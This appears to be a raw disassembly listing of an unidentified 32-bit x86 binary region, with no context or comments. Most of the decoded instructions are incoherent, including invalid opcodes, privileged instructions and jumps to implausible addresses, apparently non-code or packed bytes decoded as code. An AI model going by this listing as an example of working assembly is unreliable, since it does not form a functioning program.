  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
